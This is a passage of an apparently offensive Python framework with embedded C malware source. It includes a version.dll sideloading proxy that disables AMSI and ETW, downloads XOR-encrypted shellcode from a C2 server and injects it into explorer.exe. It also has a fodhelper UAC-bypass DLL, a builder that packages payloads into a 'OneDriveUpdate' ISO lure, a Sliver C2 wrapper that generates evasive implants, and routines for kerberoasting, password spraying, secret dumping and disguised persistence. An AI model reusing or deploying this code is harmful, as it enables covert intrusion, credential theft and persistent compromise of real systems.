typedef BOOL  (WINAPI *FN_VQVW)(LPCVOID,LPCWSTR,LPVOID*,PUINT);
static HMODULE hReal;
static FN_GFVIA p_GetFileVersionInfoA; static FN_GFVIW p_GetFileVersionInfoW;
static FN_GFVIExA p_GetFileVersionInfoExA; static FN_GFVIExW p_GetFileVersionInfoExW;
static FN_GFVISA p_GetFileVersionInfoSizeA; static FN_GFVISW p_GetFileVersionInfoSizeW;
static FN_GFVISExA p_GetFileVersionInfoSizeExA; static FN_GFVISExW p_GetFileVersionInfoSizeExW;
static FN_VFFA p_VerFindFileA; static FN_VFFW p_VerFindFileW;
static FN_VIFA p_VerInstallFileA; static FN_VIFW p_VerInstallFileW;
static FN_VLNA p_VerLanguageNameA; static FN_VLNW p_VerLanguageNameW;
static FN_VQVA p_VerQueryValueA; static FN_VQVW p_VerQueryValueW;

static void patch_mem(void *addr, const unsigned char *patch, size_t n) {
    DWORD old;
    VirtualProtect(addr, n, PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, patch, n);
    VirtualProtect(addr, n, old, &old);
}
static void xor_dec(unsigned char *d, size_t l, const unsigned char *k, size_t kl) {
    for (size_t i = 0; i < l; i++) d[i] ^= k[i % kl];
}
static DWORD find_pid(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do { if (wcscmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; } }
        while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap); return pid;
}
static int inject_remote(DWORD pid, unsigned char *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProc) return 0;
    void *remote = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) { CloseHandle(hProc); return 0; }
    SIZE_T written;
    if (!WriteProcessMemory(hProc, remote, sc, sc_len, &written)) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); CloseHandle(hProc); return 0;
    }
    HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (ht) CloseHandle(ht);
    CloseHandle(hProc); return ht != NULL;
}
static DWORD WINAPI payload_thread(LPVOID param) {
    HMODULE hA = LoadLibraryA("amsi.dll");
    if (hA) {
        void *f = GetProcAddress(hA, "AmsiScanBuffer");
        if (f) { unsigned char p[]={0x31,0xC0,0xC3}; patch_mem(f,p,3); }
    }
    HMODULE hN = GetModuleHandleA("ntdll.dll");
    if (hN) {
        void *f = GetProcAddress(hN, "EtwEventWrite");
        if (f) { unsigned char p[]={0xC3}; patch_mem(f,p,1); }
    }
    static const unsigned char key[] = {
        0x4e,0x3a,0x7f,0x12,0x89,0xab,0xcd,0xef,
        0x01,0x23,0x45,0x67,0x89,0xfe,0xdc,0xba
    };
    HINTERNET hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return 1;
    HINTERNET hConn = WinHttpConnect(hSess, C2_HOST, C2_PORT, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return 1; }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", C2_PATH, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return 1; }
    if (!WinHttpSendRequest(hReq,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0))
        goto done;
    if (!WinHttpReceiveResponse(hReq, NULL)) goto done;
    size_t cap = 1<<22, tot = 0;
    unsigned char *buf = (unsigned char*)VirtualAlloc(NULL, cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) goto done;
    DWORD got;
    while (WinHttpReadData(hReq, buf+tot, (DWORD)(cap-tot), &got) && got) {
        tot += got;
        if (tot + (1<<16) > cap) {
            cap *= 2;
            unsigned char *nb = (unsigned char*)VirtualAlloc(NULL, cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (!nb) { VirtualFree(buf,0,MEM_RELEASE); goto done; }
            memcpy(nb, buf, tot); VirtualFree(buf,0,MEM_RELEASE); buf = nb;
        }
    }
    if (tot < 4) { VirtualFree(buf,0,MEM_RELEASE); goto done; }
    DWORD expected = *(DWORD*)buf;
    unsigned char *sc = buf + 4; size_t sc_len = tot - 4;
    if ((DWORD)sc_len != expected) { VirtualFree(buf,0,MEM_RELEASE); goto done; }
    xor_dec(sc, sc_len, key, sizeof(key));
    DWORD epid = find_pid(L"explorer.exe");
    if (epid && inject_remote(epid, sc, sc_len)) { VirtualFree(buf,0,MEM_RELEASE); goto done; }
    void *exec = VirtualAlloc(NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!exec) { VirtualFree(buf,0,MEM_RELEASE); goto done; }
    memcpy(exec, sc, sc_len); VirtualFree(buf,0,MEM_RELEASE);
    DWORD old2;
    VirtualProtect(exec, sc_len, PAGE_EXECUTE_READ, &old2);
    HANDLE ht = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)exec,NULL,0,NULL);
    if (ht) WaitForSingleObject(ht, INFINITE);
done:
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
    return 0;
}
static void load_real(void) {
    char p[MAX_PATH]; GetSystemDirectoryA(p, MAX_PATH); strcat(p, "\\version.dll");
    hReal = LoadLibraryA(p); if (!hReal) return;
    p_GetFileVersionInfoA     = (FN_GFVIA)    GetProcAddress(hReal,"GetFileVersionInfoA");
    p_GetFileVersionInfoW     = (FN_GFVIW)    GetProcAddress(hReal,"GetFileVersionInfoW");
    p_GetFileVersionInfoExA   = (FN_GFVIExA)  GetProcAddress(hReal,"GetFileVersionInfoExA");
    p_GetFileVersionInfoExW   = (FN_GFVIExW)  GetProcAddress(hReal,"GetFileVersionInfoExW");
    p_GetFileVersionInfoSizeA = (FN_GFVISA)   GetProcAddress(hReal,"GetFileVersionInfoSizeA");
    p_GetFileVersionInfoSizeW = (FN_GFVISW)   GetProcAddress(hReal,"GetFileVersionInfoSizeW");
    p_GetFileVersionInfoSizeExA=(FN_GFVISExA) GetProcAddress(hReal,"GetFileVersionInfoSizeExA");
    p_GetFileVersionInfoSizeExW=(FN_GFVISExW) GetProcAddress(hReal,"GetFileVersionInfoSizeExW");
    p_VerFindFileA   = (FN_VFFA) GetProcAddress(hReal,"VerFindFileA");
    p_VerFindFileW   = (FN_VFFW) GetProcAddress(hReal,"VerFindFileW");
    p_VerInstallFileA= (FN_VIFA) GetProcAddress(hReal,"VerInstallFileA");
    p_VerInstallFileW= (FN_VIFW) GetProcAddress(hReal,"VerInstallFileW");
    p_VerLanguageNameA=(FN_VLNA) GetProcAddress(hReal,"VerLanguageNameA");
    p_VerLanguageNameW=(FN_VLNW) GetProcAddress(hReal,"VerLanguageNameW");
    p_VerQueryValueA = (FN_VQVA) GetProcAddress(hReal,"VerQueryValueA");
    p_VerQueryValueW = (FN_VQVW) GetProcAddress(hReal,"VerQueryValueW");
}
BOOL WINAPI DllMain(HMODULE hMod, DWORD reason, LPVOID res) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        load_real();
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    } else if (reason == DLL_PROCESS_DETACH && hReal) {
        FreeLibrary(hReal);
    }
    return TRUE;
}
BOOL WINAPI GetFileVersionInfoA(LPCSTR a,DWORD b,DWORD c,LPVOID d){return p_GetFileVersionInfoA?p_GetFileVersionInfoA(a,b,c,d):FALSE;}
BOOL WINAPI GetFileVersionInfoW(LPCWSTR a,DWORD b,DWORD c,LPVOID d){return p_GetFileVersionInfoW?p_GetFileVersionInfoW(a,b,c,d):FALSE;}
BOOL WINAPI GetFileVersionInfoExA(DWORD f,LPCSTR a,DWORD b,DWORD c,LPVOID d){return p_GetFileVersionInfoExA?p_GetFileVersionInfoExA(f,a,b,c,d):FALSE;}
BOOL WINAPI GetFileVersionInfoExW(DWORD f,LPCWSTR a,DWORD b,DWORD c,LPVOID d){return p_GetFileVersionInfoExW?p_GetFileVersionInfoExW(f,a,b,c,d):FALSE;}
DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR a,LPDWORD b){return p_GetFileVersionInfoSizeA?p_GetFileVersionInfoSizeA(a,b):0;}
DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR a,LPDWORD b){return p_GetFileVersionInfoSizeW?p_GetFileVersionInfoSizeW(a,b):0;}
DWORD WINAPI GetFileVersionInfoSizeExA(DWORD f,LPCSTR a,LPDWORD b){return p_GetFileVersionInfoSizeExA?p_GetFileVersionInfoSizeExA(f,a,b):0;}
DWORD WINAPI GetFileVersionInfoSizeExW(DWORD f,LPCWSTR a,LPDWORD b){return p_GetFileVersionInfoSizeExW?p_GetFileVersionInfoSizeExW(f,a,b):0;}
DWORD WINAPI VerFindFileA(DWORD a,LPSTR b,LPSTR c,LPSTR d,LPSTR e,PUINT f,LPSTR g,PUINT h){return p_VerFindFileA?p_VerFindFileA(a,b,c,d,e,f,g,h):0;}
DWORD WINAPI VerFindFileW(DWORD a,LPWSTR b,LPWSTR c,LPWSTR d,LPWSTR e,PUINT f,LPWSTR g,PUINT h){return p_VerFindFileW?p_VerFindFileW(a,b,c,d,e,f,g,h):0;}
DWORD WINAPI VerInstallFileA(DWORD a,LPSTR b,LPSTR c,LPSTR d,LPSTR e,LPSTR f,LPSTR g,PUINT h){return p_VerInstallFileA?p_VerInstallFileA(a,b,c,d,e,f,g,h):0;}
DWORD WINAPI VerInstallFileW(DWORD a,LPWSTR b,LPWSTR c,LPWSTR d,LPWSTR e,LPWSTR f,LPWSTR g,PUINT h){return p_VerInstallFileW?p_VerInstallFileW(a,b,c,d,e,f,g,h):0;}
DWORD WINAPI VerLanguageNameA(DWORD a,LPSTR b,DWORD c){return p_VerLanguageNameA?p_VerLanguageNameA(a,b,c):0;}
DWORD WINAPI VerLanguageNameW(DWORD a,LPWSTR b,DWORD c){return p_VerLanguageNameW?p_VerLanguageNameW(a,b,c):0;}
BOOL WINAPI VerQueryValueA(LPCVOID a,LPCSTR b,LPVOID *c,PUINT d){return p_VerQueryValueA?p_VerQueryValueA(a,b,c,d):FALSE;}
BOOL WINAPI VerQueryValueW(LPCVOID a,LPCWSTR b,LPVOID *c,PUINT d){return p_VerQueryValueW?p_VerQueryValueW(a,b,c,d):FALSE;}
"""

UAC_DLL_C = r"""
#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <windows.h>
#include <objbase.h>
#include <shldisp.h>
#include <shlobj.h>
#include <winreg.h>

#ifndef PAYLOAD_EXE
#define PAYLOAD_EXE L"C:\\Windows\\Temp\\svcx.exe"
#endif

static void write_reg_keys(void) {
    HKEY hCmd = NULL;
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hCmd, NULL);
    if (!hCmd) return;
    const wchar_t *exe = PAYLOAD_EXE;
    RegSetValueExW(hCmd, NULL, 0, REG_SZ, (const BYTE*)exe, (DWORD)((wcslen(exe)+1)*sizeof(wchar_t)));
    RegSetValueExW(hCmd, L"DelegateExecute", 0, REG_SZ, (const BYTE*)L"", 2);
    RegCloseKey(hCmd);
}
static void com_shellex(void) {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    IShellDispatch2 *pShell = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_Shell, NULL, CLSCTX_LOCAL_SERVER,
                                  &IID_IShellDispatch2, (void**)&pShell);
    if (FAILED(hr) || !pShell) { CoUninitialize(); return; }
    VARIANT vEmpty = {0};
    VARIANT vShow; VariantInit(&vShow);
    vShow.vt = VT_INT; vShow.intVal = 0;
    BSTR bExe = SysAllocString(L"fodhelper.exe");
    IShellDispatch2_ShellExecute(pShell, bExe, vEmpty, vEmpty, vEmpty, vShow);
    SysFreeString(bExe);
    IShellDispatch2_Release(pShell);
    CoUninitialize();
}
static DWORD WINAPI bypass_thread(LPVOID p) {
    write_reg_keys();
    com_shellex();
    Sleep(4000);
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    return 0;
}
BOOL WINAPI DllMain(HMODULE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, bypass_thread, NULL, 0, NULL);
    }
    return TRUE;
}
"""


# ============================================================================
# PAYLOAD BUILDER
# ============================================================================

class PayloadBuilder:
    """
    Compile Windows payloads and build delivery packages.
    Requires zig cross-compiler and xorriso (for ISO).
    """

    DEFAULT_XOR_KEY = bytes([0x4e,0x3a,0x7f,0x12,0x89,0xab,0xcd,0xef,
                              0x01,0x23,0x45,0x67,0x89,0xfe,0xdc,0xba])

    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.zig    = CAPS['zig'] or ''
        self.donut  = CAPS['donut'] or ''
        output_dir.mkdir(parents=True, exist_ok=True)

    # ---- compile proxy DLL (version.dll sideloading) ----
    def build_proxy_dll(self, c2_host: str = '192.168.1.114',
                        c2_port: int = 9000,
                        c2_path: str = '/update.bin') -> Optional[Path]:
        if not self.zig:
            log("proxy_dll: zig not found"); return None
        src = self.output_dir / 'proxy_version.c'
        src.write_text(PROXY_DLL_C)
        out = self.output_dir / 'version.dll'
        rc, stdout, stderr = run_cmd([
            self.zig, 'cc', '-target', 'x86_64-windows-gnu',
            '-shared', '-O2', '-s',
            f'-DC2_HOST=L"{c2_host}"',
            f'-DC2_PORT={c2_port}',
            f'-DC2_PATH=L"{c2_path}"',
            '-o', str(out), str(src),
            '-lwinhttp', '-lkernel32'
        ], timeout=180)
        if rc != 0:
            log(f"proxy_dll compile failed: {stderr[-300:]}")
            return None
        log(f"proxy_dll → {out} ({out.stat().st_size} bytes)")
        return out

    # ---- compile UAC bypass DLL ----
    def build_uac_dll(self, payload_exe: str = r'C:\Windows\Temp\svcx.exe') -> Optional[Path]:
        if not self.zig:
            log("uac_dll: zig not found"); return None
        src = self.output_dir / 'uacbypass.c'
        src.write_text(UAC_DLL_C)
        out = self.output_dir / 'uacbypass.dll'
        # escape backslashes for C macro string
        exe_escaped = payload_exe.replace('\\', '\\\\')
        rc, _, stderr = run_cmd([
            self.zig, 'cc', '-target', 'x86_64-windows-gnu',
            '-shared', '-O2', '-s',
            f'-DPAYLOAD_EXE=L"{exe_escaped}"',
            '-o', str(out), str(src),
            '-lshell32', '-ladvapi32', '-lole32', '-loleaut32', '-lkernel32'
        ], timeout=120)
        if rc != 0:
            log(f"uac_dll compile: {stderr[-300:]}"); return None
        log(f"uac_dll → {out} ({out.stat().st_size} bytes)")
        return out

    # ---- donut: PE → shellcode ----
    def pe_to_shellcode(self, exe_path: Path) -> Optional[Path]:
        if not self.donut:
            log("donut not found"); return None
        out = self.output_dir / 'implant.bin'
        rc, _, stderr = run_cmd([
            self.donut, '-f', '1',   # format: raw shellcode
            '-a', '2',               # arch: amd64
            '-o', str(out), str(exe_path)
        ], timeout=120)
        if rc != 0 or not out.exists():
            log(f"donut: {stderr[-300:]}"); return None
        log(f"shellcode → {out} ({out.stat().st_size} bytes)")
        return out

    # ---- XOR encrypt + length-prefix → update.bin ----
    def encrypt_shellcode(self, sc_path: Path,
                          key: Optional[bytes] = None) -> Optional[Path]:
        key = key or self.DEFAULT_XOR_KEY
        sc = sc_path.read_bytes()
        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))
        out = self.output_dir / 'update.bin'
        with open(out, 'wb') as f:
            f.write(struct.pack('<I', len(encrypted)))
            f.write(encrypted)
        log(f"update.bin → {out} ({out.stat().st_size} bytes)")
        return out

    # ---- build delivery ISO ----
    def build_iso(self, dll_path: Path, legit_exe_path: Path,
                  label: str = 'OneDriveUpdate') -> Optional[Path]:
        if not shutil.which('xorriso'):
            log("xorriso not found"); return None
        staging = self.output_dir / 'iso_stage'
        staging.mkdir(exist_ok=True)
        shutil.copy(str(legit_exe_path), str(staging / legit_exe_path.name))
        shutil.copy(str(dll_path), str(staging / dll_path.name))
        out = self.output_dir / f'{label}.iso'
        rc, _, err = run_cmd([
            'xorriso', '-as', 'mkisofs',
            '-o', str(out), '-V', label,
            '-J', '-joliet-long', str(staging)
        ], timeout=60)
        if rc != 0 or not out.exists():
            log(f"xorriso: {err[-300:]}"); return None
        log(f"ISO → {out} ({out.stat().st_size} bytes)")
        return out

    # ---- full gen_all chain ----
    def full_chain(self, c2_host: str, c2_port_payload: int = 9000,
                   sliver_exe_path: Optional[Path] = None,
                   legit_exe_path: Optional[Path] = None) -> Dict[str, Any]:
        result: Dict[str, Any] = {}
        dll = self.build_proxy_dll(c2_host, c2_port_payload)
        result['proxy_dll'] = str(dll) if dll else None
        if sliver_exe_path and sliver_exe_path.exists():
            sc = self.pe_to_shellcode(sliver_exe_path)
            result['shellcode'] = str(sc) if sc else None
            if sc:
                enc = self.encrypt_shellcode(sc)
                result['update_bin'] = str(enc) if enc else None
        else:
            result['shellcode'] = None
            result['update_bin'] = None
        if dll and legit_exe_path and legit_exe_path.exists():
            iso = self.build_iso(dll, legit_exe_path)
            result['iso'] = str(iso) if iso else None
        else:
            result['iso'] = None
        uac = self.build_uac_dll()
        result['uac_dll'] = str(uac) if uac else None
        return result


# ============================================================================
# SLIVER C2 BRIDGE
# ============================================================================

class SliverBridge:
    """
    Wraps sliver-client CLI for scripted C2 operations.
    Uses --rc script files for console commands, implant subcommand for session ops.
    """

    def __init__(self,
                 client_bin: Optional[str] = None,
                 config_path: Optional[str] = None):
        self.client = client_bin or CAPS['sliver_client'] or ''
        self.config = config_path or CAPS['sliver_config'] or ''

    @property
    def available(self) -> bool:
        return bool(self.client and os.path.isfile(self.client))

    def _rc(self, commands: List[str], timeout: int = 60) -> str:
        if not self.available:
            return ''
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write('\n'.join(commands + ['exit']) + '\n')
            rc_path = f.name
        try:
            cmd = [self.client]
            if self.config and os.path.isfile(self.config):
                pass  # config auto-loaded from ~/.sliver-client/configs/
            cmd += ['console', '--rc', rc_path]
            rc, out, err = run_cmd(cmd, timeout=timeout)
            return out + err
        finally:
            os.unlink(rc_path)

    def _implant_cmd(self, session_id: str, args: List[str], timeout: int = 60) -> Tuple[int, str, str]:
        if not self.available:
            return 1, '', 'sliver-client not found'
        cmd = [self.client, 'implant', '-s', session_id] + args
        return run_cmd(cmd, timeout=timeout)

    def sessions(self) -> List[Dict[str, Any]]:
        out = self._rc(['sessions'])
        sessions: List[Dict[str, Any]] = []
        for line in out.splitlines():
            # Parse table rows: ID, Name, Transport, RemoteAddr, Hostname, Username, OS/Arch, ...
            m = re.match(r'\s*([0-9a-f]{8,})\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)', line)
            if m:
                sessions.append({
                    'id':          m.group(1),
                    'name':        m.group(2),
                    'transport':   m.group(3),
                    'remote_addr': m.group(4),
                    'hostname':    m.group(5),
                    'username':    m.group(6),
                })
        return sessions

    def execute(self, session_id: str, command: str, timeout: int = 60) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id,
            ['execute', '--output', '--', 'cmd.exe', '/Q', '/c', command], timeout=timeout)
        return {'returncode': rc, 'output': out, 'stderr': err}

    def shell_command(self, session_id: str, command: str, timeout: int = 60) -> Dict[str, Any]:
        """Use execute-assembly or shell for complex commands."""
        out = self._rc([f'use {session_id}', f'execute -o -- cmd.exe /Q /c {command}'])
        return {'output': out}

    def upload(self, session_id: str, local_path: str, remote_path: str,
               timeout: int = 120) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id,
            ['upload', '--src', local_path, '--dst', remote_path], timeout=timeout)
        return {'returncode': rc, 'output': out, 'error': err if rc != 0 else None}

    def download(self, session_id: str, remote_path: str, local_path: str,
                 timeout: int = 120) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id,
            ['download', remote_path, local_path], timeout=timeout)
        return {'returncode': rc, 'output': out, 'error': err if rc != 0 else None}

    def ps(self, session_id: str) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id, ['ps'])
        procs = []
        for line in out.splitlines()[2:]:
            parts = line.split()
            if len(parts) >= 3:
                procs.append({'pid': parts[0], 'ppid': parts[1], 'name': parts[2],
                               'owner': parts[3] if len(parts) > 3 else ''})
        return {'processes': procs, 'raw': out}

    def spawndll(self, session_id: str, dll_path: str,
                 pid: Optional[int] = None) -> Dict[str, Any]:
        args = ['spawndll']
        if pid:
            args += ['--pid', str(pid)]
        args.append(dll_path)
        rc, out, err = self._implant_cmd(session_id, args, timeout=60)
        return {'returncode': rc, 'output': out, 'error': err if rc != 0 else None}

    def getsystem(self, session_id: str) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id, ['getsystem'], timeout=60)
        return {'returncode': rc, 'output': out, 'elevated': rc == 0}

    def registry_write(self, session_id: str, hive: str, key: str,
                       name: str, value: str, reg_type: str = 'string') -> Dict[str, Any]:
        args = ['registry', 'write', '--hive', hive, '--key', key,
                '--name', name, f'--{reg_type}', value]
        rc, out, err = self._implant_cmd(session_id, args, timeout=30)
        return {'returncode': rc, 'output': out, 'error': err if rc != 0 else None}

    def registry_read(self, session_id: str, hive: str, key: str, name: str) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id,
            ['registry', 'read', '--hive', hive, '--key', key, '--name', name], timeout=30)
        return {'returncode': rc, 'output': out, 'error': err if rc != 0 else None}

    def whoami(self, session_id: str) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id, ['whoami'], timeout=15)
        return {'output': out.strip(), 'returncode': rc}

    def screenshot(self, session_id: str, save_path: Optional[str] = None) -> Dict[str, Any]:
        args = ['screenshot']
        if save_path:
            args += ['--save', save_path]
        rc, out, err = self._implant_cmd(session_id, args, timeout=30)
        return {'returncode': rc, 'output': out, 'saved': save_path}

    def impersonate(self, session_id: str, username: str) -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id, ['impersonate', username], timeout=30)
        return {'returncode': rc, 'output': out}

    def make_token(self, session_id: str, username: str,
                   password: str, domain: str = '.') -> Dict[str, Any]:
        rc, out, err = self._implant_cmd(session_id,
            ['make-token', '-u', username, '-p', password, '-d', domain], timeout=30)
        return {'returncode': rc, 'output': out}

    def gen_implant(self, c2_host: str, c2_port: int = 8443,
                    fmt: str = 'exe', output_path: Optional[str] = None) -> Dict[str, Any]:
        """Generate a Sliver implant via the generate command."""
        if not output_path:
            output_path = f'/tmp/sliver_implant_{ts()}.{fmt}'
        cmds = [
            f'generate --http {c2_host}:{c2_port} --os windows --arch amd64 '
            f'--format {fmt} --save {output_path} --evasion --name WinUpdate --skip-symbols'
        ]
        out = self._rc(cmds, timeout=600)
        success = os.path.isfile(output_path) and os.path.getsize(output_path) > 0
        return {'output': out, 'path': output_path if success else None,
                'success': success}

    def listeners(self) -> str:
        return self._rc(['jobs'])

    def start_listener(self, host: str, port: int, proto: str = 'http') -> str:
        return self._rc([f'{proto} -L {host} -l {port}'])


# ============================================================================
# OUTPUT + DISPATCHER
# ============================================================================

def emit(success: bool, data: Dict[str, Any], errors: Optional[List[str]] = None) -> None:
    caps_bool = {k: (bool(v) if isinstance(v, str) else v)
                 for k, v in CAPS.items() if isinstance(v, (bool, str, type(None)))}
    print(json.dumps({'success': success, 'data': data, 'errors': errors or [],
                      'capabilities': caps_bool}, default=str, indent=2))


def main() -> None:
    try:
        ctx = json.loads(sys.stdin.read() or '{}')
    except json.JSONDecodeError as e:
        emit(False, {}, [f"invalid JSON: {e}"]); return
    target    = ctx.get('target') or ctx.get('host') or ''
    params    = ctx.get('params', {}) or {}
    if not target:
        emit(False, {}, ["target is required"]); return
    operation = (params.get('operation') or 'discover').lower().strip()
    timeout   = int(params.get('timeout', 30) or 30)
    threads   = int(params.get('threads', 20) or 20)
    output_dir = Path(params.get('output_dir') or './winadsec-loot').resolve()
    auth = ADAuth(params)
    if not auth.dc_ip:
        auth.dc_ip = target

    info = ADDiscovery(target, timeout=timeout).run()
    data: Dict[str, Any] = {'domain_info': asdict(info)}
    if auth.domain:
        info.domain = auth.domain
    elif info.domain:
        auth.domain = info.domain
    errors: List[str] = []

    def load_lines(p: str) -> List[str]:
        try:
            return [l.strip() for l in open(p, errors='replace') if l.strip() and not l.startswith('#')]
        except Exception as e:
            errors.append(f"read {p}: {e}"); return []

    # ── assessment ops ────────────────────────────────────────────────
    def do_users():
        log("→ users")
        en = ADEnumerator(target, auth, timeout=timeout)
        users = en.users_via_ldap() if (auth.has_creds or info.ldap_anonymous) else []
        if not users:
            users = en.users_via_samr(int(params.get('rid_max', 4000) or 4000))
        data['users'] = [asdict(u) for u in users]

    def do_groups():
        log("→ groups")
        data['groups'] = [asdict(g) for g in ADEnumerator(target, auth, timeout).groups_via_ldap()]

    def do_shares():
        log("→ shares")
        data['shares'] = [asdict(s) for s in ADEnumerator(target, auth, timeout).shares()]

    def do_passpol():
        log("→ passpol")
        data['passpol'] = ADEnumerator(target, auth, timeout).passpol()

    def do_kerberoast():
        log("→ kerberoast")
        if not auth.has_creds:
            errors.append("kerberoast needs creds"); return
        hashes = KerberosAttacker(target, auth, timeout).kerberoast()
        data['kerberoast'] = hashes
        if hashes:
            output_dir.mkdir(parents=True, exist_ok=True)
            f = output_dir / f"kerberoast-{ts()}.hashes"
            f.write_text('\n'.join(h['hash'] for h in hashes))
            log(f"saved {len(hashes)} hashes → {f}")

    def do_asreproast():
        log("→ asreproast")
        users = load_lines(params['userlist']) if params.get('userlist') else []
        if not users and not data.get('users'):
            do_users()
        if not users:
            users = [u['username'] for u in data.get('users', [])]
        if not users:
            errors.append("asreproast needs users"); return
        hashes = KerberosAttacker(target, auth, timeout).asreproast(users)
        data['asreproast'] = hashes
        if hashes:
            output_dir.mkdir(parents=True, exist_ok=True)
            f = output_dir / f"asreproast-{ts()}.hashes"
            f.write_text('\n'.join(h['hash'] for h in hashes))

    def do_spray():
        log("→ spray")
        users = load_lines(params['userlist']) if params.get('userlist') else [
            u['username'] for u in data.get('users', [])]
        passwords = ([params['single_password']] if params.get('single_password') else
                     load_lines(params['passlist']) if params.get('passlist') else [])
        if not users or not passwords:
            errors.append("spray needs userlist + single_password or passlist"); return
        threshold = 0
        if params.get('safe_spray', True):
            if not data.get('passpol'):
                do_passpol()
            threshold = int((data.get('passpol') or {}).get('lockout_threshold') or 0)
        excl = [s.strip() for s in (params.get('exclude_users') or '').split(',') if s.strip()]
        data['spray_results'] = [asdict(r) for r in
                                 PasswordSprayer(target, auth, timeout=5).spray_smb(
                                     users, passwords, lockout_threshold=threshold,
                                     threads=threads, exclude=excl)]

    def do_vulncheck():
        log("→ vulncheck")
        data['vulnerabilities'] = [asdict(v) for v in VulnChecker(target, info, timeout).run()]

    def do_bloodhound():
        log("→ bloodhound")
        if not auth.has_creds:
            errors.append("bloodhound needs creds"); return
        data['bloodhound'] = BloodHoundCollector(
            target, auth, output_dir,
            collection=params.get('bloodhound_collection', 'Default'),
            timeout=timeout * 30).run()

    def do_loot():
        log("→ loot")
        if not data.get('shares'):
            do_shares()
        data['loot'] = [asdict(i) for i in ShareLooter(
            target, auth, [SMBShare(**s) for s in data.get('shares', [])], timeout).run()]

    def do_secrets():
        log("→ secrets")
        data['secrets'] = SecretsDumper(target, auth, output_dir, timeout * 20).run()

    def do_exec():
        log("→ exec")
        if not auth.has_creds:
            errors.append("exec needs creds"); return
        data['exec'] = RemoteExec(target, auth, timeout).run_command(
            params.get('command', 'whoami /all'))

    def do_privesc_check():
        log("→ privesc_check")
        if not auth.has_creds:
            errors.append("privesc_check needs creds"); return
        data['privesc'] = RemoteExec(target, auth, max(120, timeout)).run_privesc_audit(output_dir)

    # ── post-exploitation ops ─────────────────────────────────────────
    def do_uac_bypass():
        log("→ uac_bypass")
        if not auth.has_creds:
            errors.append("uac_bypass needs creds"); return
        data['uac_bypass'] = UACBypasser(target, auth, timeout * 2).run(
            method=params.get('uac_method', 'fodhelper'),
            payload_type=params.get('uac_payload', 'lsa_fix'),
            payload_cmd=params.get('payload_cmd') or None)

    def do_lsa_fix():
        log("→ lsa_fix")
        if not auth.has_creds:
            errors.append("lsa_fix needs creds"); return
        result = UACBypasser(target, auth, timeout * 2).run(
            method=params.get('uac_method', 'fodhelper'),
            payload_type='lsa_fix')
        data['lsa_fix'] = result
        if result.get('bypassed'):
            log("LimitBlankPasswordUse disabled")
        else:
            errors.append("lsa_fix: could not verify — may need higher integrity first")

    def do_persistence():
        log("→ persistence")
        if not auth.has_creds:
            errors.append("persistence needs creds"); return
        exe = params.get('exe') or params.get('payload_exe', r'C:\Windows\Temp\svcx.exe')
        method = params.get('persist_method', 'run_key')
        name   = params.get('persist_name', 'WindowsDefenderHelper')
        delay  = int(params.get('persist_delay', 0) or 0)
        p = Persistence(target, auth, timeout)
        if params.get('remove'):
            data['persistence'] = p.remove(method, name)
        else:
            data['persistence'] = p.install(exe, method, name, delay)

